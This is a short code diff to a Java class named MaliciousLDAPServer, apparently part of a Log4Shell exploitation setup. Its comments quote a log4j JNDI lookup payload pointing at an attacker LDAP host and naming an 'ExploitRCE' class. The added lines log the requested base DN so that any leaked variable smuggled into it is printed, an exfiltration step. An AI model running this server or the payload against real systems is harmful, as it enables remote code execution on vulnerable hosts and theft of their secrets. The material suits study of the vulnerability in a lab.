@@ -62,7 +62,9 @@ public class MaliciousLDAPServer {
             // create new entry with request base distinguished name, in the log4j JNDI lookup
             // ${jndi:ldap://snoopy-ldap-server:1389/ExploitRCE} what follows the 1389/ will be
             // the base distinguished name, base will be the name of the exploit class. 
+            // If the base dn is a leaked variable, it will be printed. 
             String base = result.getRequest().getBaseDN();
+            System.out.println("Received LDAP request with base: " + base);
             Entry e = new Entry(base);                                                                              
 
             try {                                                                       
